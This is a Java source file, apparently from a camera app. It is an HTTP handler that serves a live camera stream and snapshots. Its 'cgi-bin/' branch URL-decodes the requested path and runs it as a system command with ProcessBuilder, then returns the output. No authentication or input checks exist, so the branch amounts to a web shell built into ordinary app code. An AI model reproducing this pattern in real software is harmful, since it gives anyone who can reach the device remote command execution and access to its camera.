package com.example.myapp;

import org.apache.commons.io.IOUtils;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStream;
import java.net.URLDecoder;

import static java.lang.Thread.sleep;

public class ClientSpecialUriHandler {

    private final MyPreviewCallback previewCallback;
    private final MyPictureCallback pictureCallback;

    public ClientSpecialUriHandler(MyPreviewCallback previewCallback, MyPictureCallback pictureCallback) {
        this.previewCallback = previewCallback;
        this.pictureCallback = pictureCallback;
    }

    public boolean handle(String requestedPath, OutputStream o, BufferedWriter out) throws InterruptedException, IOException {
        if (requestedPath.startsWith("camera/stream")) {
            previewCallback.addClient(o);
            while (true) {
                sleep(1000);
            }
        } else if (requestedPath.startsWith("camera/snapshot")) {
            byte[] previousTakenPicture = pictureCallback.getPreviousTakenPicture();
            if (previousTakenPicture != null) {
                out.write("HTTP/1.1 200 Ok\n" +
                        "Content-Type: " + "image/jpeg" + "\n" +
                        "Content-length: " + previousTakenPicture.length + "\n" +
                        "\n");
                out.flush();
                o.write(previousTakenPicture);
            }
            return true;

        } else if (requestedPath.startsWith("cgi-bin/")) {
            String encodedComand = requestedPath.replaceFirst("cgi-bin/", "");
            String decodedCommand = URLDecoder.decode(encodedComand, "UTF-8").trim();

            if (decodedCommand.isEmpty()) return true;

            String[] args = decodedCommand.split(" ");
            Process p = new ProcessBuilder(args).start();
            out.write("HTTP/1.1 200 Ok\n" +
                    "Content-Type: text/html\n" +
                    "\n");
            out.flush();

            IOUtils.copy(p.getInputStream(), o);
            o.flush();
            return true;
        }
        return false;
    }
}
